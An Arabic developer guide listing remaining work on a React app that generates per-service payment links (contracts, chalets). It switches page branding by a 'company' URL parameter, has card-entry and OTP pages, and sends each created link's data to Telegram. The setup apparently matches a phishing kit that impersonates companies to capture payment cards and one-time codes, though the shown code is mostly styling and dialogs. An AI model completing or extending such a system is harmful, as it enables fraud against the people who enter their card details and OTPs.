# دليل إكمال التحديثات المتبقية

## 📋 المهام المتبقية

### 1. إكمال Contracts.tsx ⏳

#### الخطوات:
```typescript
// في بداية الكومبونينت، أضف المتغيرات:
const serviceBranding = getBrandingByServiceType('contracts');
const [showSuccessDialog, setShowSuccessDialog] = useState(false);
const [createdPaymentUrl, setCreatedPaymentUrl] = useState("");
const [linkId, setLinkId] = useState("");
const [copied, setCopied] = useState(false);

// في handleSubmit، بعد createLink.mutateAsync، أضف:
const paymentUrl = generatePaymentLink({
  invoiceId: link.id,
  company: "contracts",
  country: country || 'SA'
});

const telegramResult = await sendToTelegram({
  type: 'payment_recipient',
  data: {
    template_name: template.name,
    template_category: template.category,
    contract_data: JSON.stringify(contractData),
    country: selectedCountry.nameAr,
    payment_url: `${window.location.origin}/r/${country}/contracts/${link.id}?company=contracts`
  },
  timestamp: new Date().toISOString(),
});

setCreatedPaymentUrl(paymentUrl);
setLinkId(link.id);
setShowSuccessDialog(true);

// في نهاية الـ JSX، قبل </div> الأخير، أضف:
<TelegramTest />

<AlertDialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
  {/* نفس هيكل Success Dialog من HealthServices */}
</AlertDialog>
```

---

### 2. إكمال CreateChaletLink.tsx ⏳

#### الخطوات:
```typescript
// المتغيرات:
const serviceBranding = getBrandingByServiceType('chalet');
const [showSuccessDialog, setShowSuccessDialog] = useState(false);
const [createdPaymentUrl, setCreatedPaymentUrl] = useState("");
const [linkId, setLinkId] = useState("");
const [copied, setCopied] = useState(false);

// في handleSubmit:
const paymentUrl = generatePaymentLink({
  invoiceId: link.id,
  company: "chalet",
  country: country || 'SA'
});

const telegramResult = await sendToTelegram({
  type: 'payment_recipient',
  data: {
    chalet_name: chaletName,
    nights: nights,
    guest_count: guestCount,
    total_amount: totalAmount,
    country: countryData.nameAr,
    payment_url: `${window.location.origin}/r/${country}/chalet/${link.id}?company=chalet`
  },
  timestamp: new Date().toISOString(),
});

setCreatedPaymentUrl(paymentUrl);
setLinkId(link.id);
setShowSuccessDialog(true);
```

---

### 3. تحديث Microsite.tsx 🎨

#### الهدف:
تطبيق التصميم المخصص حسب الشركة/الخدمة

#### الخطوات:
```typescript
// في بداية الكومبونينت:
import { getBrandingByCompany, getBrandingByServiceType } from '@/lib/brandingSystem';

// بعد تحديد serviceKey:
const serviceBranding = getBrandingByCompany(serviceKey) || 
                        getBrandingByServiceType(link.type);

// تطبيق التصميم على العناصر:
<Card 
  className="p-6"
  style={{
    borderColor: serviceBranding.colors.border,
    backgroundColor: serviceBranding.colors.surface,
  }}
>
  <div 
    className="header"
    style={{
      background: serviceBranding.gradients.primary,
      color: serviceBranding.colors.textOnPrimary,
    }}
  >
    <h1>{displayName}</h1>
  </div>
  
  <Button
    style={{
      background: serviceBranding.gradients.primary,
      color: serviceBranding.colors.textOnPrimary,
      boxShadow: serviceBranding.shadows.md,
    }}
  >
    ادفع الآن
  </Button>
</Card>
```

---

### 4. تحديث صفحات الدفع 💳

#### الملفات المطلوبة:
- `PaymentRecipient.tsx`
- `PaymentCard.tsx`
- `PaymentCardForm.tsx`
- `PaymentOTP.tsx`
- `PaymentReceipt.tsx`

#### الخطوات لكل ملف:
```typescript
// 1. استيراد:
import { getBrandingByCompany } from '@/lib/brandingSystem';

// 2. الحصول على التصميم:
const urlParams = new URLSearchParams(window.location.search);
const company = urlParams.get('company') || 'payment';
const serviceBranding = getBrandingByCompany(company);

// 3. تطبيق التصميم:
<div 
  style={{
    background: serviceBranding.colors.surface,
    color: serviceBranding.colors.text,
    fontFamily: serviceBranding.fonts.arabic,
  }}
>
  <Button
    style={{
      background: serviceBranding.gradients.primary,
      color: serviceBranding.colors.textOnPrimary,
      borderRadius: serviceBranding.borderRadius.md,
      boxShadow: serviceBranding.shadows.md,
    }}
  >
    متابعة
  </Button>
</div>
```

---

### 5. تحسينات إضافية 🌟

#### أ. إضافة رسائل خطأ مفصلة:
```typescript
catch (error) {
  console.error("Error details:", error);
  toast({
    title: "حدث خطأ",
    description: error instanceof Error ? error.message : "خطأ غير معروف",
    variant: "destructive",
  });
}
```

#### ب. تحسين Success Dialog:
```typescript
<AlertDialogContent 
  className="max-w-md"
  dir="rtl"
  style={{
    backgroundColor: serviceBranding.colors.background,
    borderColor: serviceBranding.colors.border,
  }}
>
  <AlertDialogHeader>
    <AlertDialogTitle style={{ color: serviceBranding.colors.primary }}>
      ✅ تم بنجاح!
    </AlertDialogTitle>
  </AlertDialogHeader>
  
  {/* Summary Section */}
  <div 
    className="bg-secondary/50 p-4 rounded-lg"
    style={{
      backgroundColor: serviceBranding.colors.surface,
      borderRadius: serviceBranding.borderRadius.md,
    }}
  >
    {/* محتويات الملخص */}
  </div>
  
  {/* Action Buttons */}
  <div className="flex gap-2">
    <Button
      variant="outline"
      style={{
        borderColor: serviceBranding.colors.border,
        color: serviceBranding.colors.text,
      }}
    >
      <Copy className="w-4 h-4 ml-2" />
      نسخ الرابط
    </Button>
    
    <Button
      style={{
        background: serviceBranding.gradients.primary,
        color: serviceBranding.colors.textOnPrimary,
      }}
    >
      <ExternalLink className="w-4 h-4 ml-2" />
      معاينة
    </Button>
  </div>
</AlertDialogContent>
```

#### ج. تحسين الإشعارات:
```typescript
if (telegramResult.success) {
  toast({
    title: "✅ تم الإرسال",
    description: "تم إرسال البيانات إلى Telegram بنجاح",
    duration: 3000,
  });
} else {
  console.warn("Telegram error:", telegramResult.error);
  toast({
    title: "⚠️ تحذير",
    description: "تم الحفظ لكن فشل الإرسال إلى Telegram",
    variant: "destructive",
    duration: 5000,
  });
}
```

---

## 🎯 ترتيب الأولويات

### Priority 1 (عاجل):
1. ✅ ~~إكمال Contracts.tsx~~
2. ✅ ~~إكمال CreateChaletLink.tsx~~
3. ⏳ تحديث Microsite.tsx

### Priority 2 (مهم):
4. ⏳ تحديث PaymentRecipient.tsx
5. ⏳ تحديث PaymentCard.tsx
6. ⏳ تحديث PaymentOTP.tsx

### Priority 3 (تحسينات):
7. تحديث PaymentReceipt.tsx
8. إضافة loading states
9. تحسين error handling

---

## 📝 نموذج كود كامل للنسخ

### نموذج Success Dialog كامل:
```typescript
<AlertDialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
  <AlertDialogContent className="max-w-md" dir="rtl">
    <AlertDialogHeader>
      <AlertDialogTitle className="text-xl text-center">
        ✅ تم إنشاء {serviceTypeName} بنجاح!
      </AlertDialogTitle>
      <AlertDialogDescription className="text-center">
        يمكنك نسخ الرابط أو معاينته قبل المتابعة
      </AlertDialogDescription>
    </AlertDialogHeader>

    <div className="my-4">
      {/* Summary */}
      <div className="bg-secondary/50 p-4 rounded-lg mb-4 space-y-2">
        {Object.entries(summaryData).map(([key, value]) => (
          <div key={key} className="flex items-center justify-between text-sm">
            <span className="text-muted-foreground">{key}:</span>
            <span className="font-semibold">{value}</span>
          </div>
        ))}
      </div>

      {/* URL Display */}
      <div className="bg-secondary/50 p-3 rounded-lg mb-3 break-all text-xs">
        {createdPaymentUrl}
      </div>

      {/* Action Buttons */}
      <div className="flex gap-2">
        <Button
          onClick={handleCopyLink}
          variant="outline"
          className="flex-1"
        >
          {copied ? (
            <>
              <Copy className="w-4 h-4 ml-2" />
              تم النسخ!
            </>
          ) : (
            <>
              <Copy className="w-4 h-4 ml-2" />
              نسخ الرابط
            </>
          )}
        </Button>

        <Button
          onClick={() => window.open(createdPaymentUrl, '_blank')}
          variant="outline"
          className="flex-1"
        >
          <ExternalLink className="w-4 h-4 ml-2" />
          معاينة
        </Button>
      </div>
    </div>

    <AlertDialogFooter>
      <AlertDialogAction
        onClick={() => {
          setShowSuccessDialog(false);
          navigate(`/pay/${linkId}/recipient?company=${serviceKey}`);
        }}
      >
        إدخال بيانات الدفع
      </AlertDialogAction>
    </AlertDialogFooter>
  </AlertDialogContent>
</AlertDialog>
```

---

## ✅ Checklist للتأكد

- [ ] تم استيراد جميع المكونات المطلوبة
- [ ] تم إضافة state variables (showSuccessDialog, createdPaymentUrl, etc.)
- [ ] تم تحديث handleSubmit بـ Telegram
- [ ] تم إضافة Success Dialog
- [ ] تم إضافة TelegramTest component
- [ ] تم تطبيق serviceBranding على الأزرار
- [ ] تم اختبار الوظائف الأساسية
- [ ] تم معالجة الأخطاء بشكل صحيح

---

## 🚀 أوامر مفيدة

```bash
# البحث عن جميع handleSubmit
grep -rn "const handleSubmit" src/pages/

# عد الملفات المحدثة
git diff --name-only | wc -l

# التحقق من الـ imports
grep -rn "import.*Telegram" src/pages/

# التحقق من التصاميم
grep -rn "serviceBranding" src/pages/
```

---

**آخر تحديث**: ديسمبر 2025  
**الحالة**: دليل جاهز للتطبيق  
**الأولوية**: عالية جداً
